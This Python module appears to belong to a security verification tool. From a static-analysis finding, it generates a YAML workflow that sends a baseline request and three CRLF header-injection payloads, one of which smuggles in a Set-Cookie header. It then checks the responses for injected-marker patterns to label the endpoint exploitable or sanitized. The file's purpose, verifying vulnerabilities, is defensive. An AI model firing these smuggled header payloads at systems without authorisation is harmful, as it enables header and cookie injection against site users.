"""CRLF-injection test blueprint — flyto-core YAML.

Oracle: `%0d%0aX-Injected:flyto-test` in a user-controlled value that flows
into a response header. If the server's response body or headers ends up
with the injected line (e.g. reflected into Set-Cookie or custom header
handling), exploitable.
"""
from __future__ import annotations

import yaml

from ..schema import SecurityFinding


_CRLF_MARKERS = [
    "X-Injected: flyto-test",
    "X-Injected:flyto-test",
    "Set-Cookie: flyto-test=",
]


def generate(finding: SecurityFinding, target_url: str, auth_token: str | None) -> str:
    method = (finding.http_method or "GET").upper()
    param = finding.param_name or "redirect"
    path = finding.endpoint_path or "/go"
    base = f"{target_url}{path}"

    payloads = [
        ("basic_crlf", "/%0d%0aX-Injected:%20flyto-test"),
        ("full_url_crlf", "https://ok.example.com/%0d%0aX-Injected:%20flyto-test"),
        ("url_encoded_cookie", "/%0d%0aSet-Cookie:%20flyto-test=1"),
    ]

    probe_requests = [_req(method, base, param, "/home", auth_token)]
    for _l, p in payloads:
        probe_requests.append(_req(method, base, param, p, auth_token))

    workflow = {
        "id": f"verify_crlf_{param}",
        "name": f"CRLF Injection Verify: {param} at {path}",
        "version": "1.0.0",
        "description": f"Auto-generated CRLF-injection verification at {finding.source_file}:{finding.source_line}",
        "timeout": 120,
        "steps": [
            {"id": "start", "module": "flow.start", "label": "Start", "params": {}, "orderIndex": 0},
            {
                "id": "crlf_probes",
                "module": "http.batch",
                "label": "CRLF Injection Probes",
                "params": {
                    "description": "Baseline + 3 CRLF payloads targeting header injection",
                    "requests": probe_requests,
                    "timeout": 10,
                    "ssrf_protection": False,
                    "detect_patterns": _CRLF_MARKERS,
                },
                "orderIndex": 1,
            },
            {
                "id": "assert_crlf",
                "module": "test.assert_contains",
                "label": "Assert CRLF Reflected",
                "params": {
                    "source": "${crlf_probes.items}",
                    "patterns": _CRLF_MARKERS,
                    "match_mode": "any",
                    "on_match": "exploitable",
                    "on_no_match": "sanitized",
                },
                "orderIndex": 2,
            },
            {
                "id": "report",
                "module": "output.display",
                "label": "Report",
                "params": {
                    "format": "json",
                    "data": {
                        "result": "${assert_crlf.data}",
                        "finding_source": f"{finding.source_file}:{finding.source_line}",
                        "finding_sink": f"{finding.sink_file}:{finding.sink_line}",
                    },
                },
                "orderIndex": 3,
            },
        ],
        "edges": [
            {"source": "start", "target": "crlf_probes"},
            {"source": "crlf_probes", "target": "assert_crlf"},
            {"source": "assert_crlf", "target": "report"},
        ],
    }
    return yaml.dump(workflow, default_flow_style=False, allow_unicode=True, sort_keys=False)


def _req(method, base, param, value, auth_token):
    headers: dict[str, str] = {}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"
    if method == "GET":
        sep = "&" if "?" in base else "?"
        req: dict = {"method": "GET", "url": f"{base}{sep}{param}={value}"}
    else:
        headers["Content-Type"] = "application/json"
        req = {"method": method, "url": base, "body": {param: value}}
    if headers:
        req["headers"] = headers
    return req
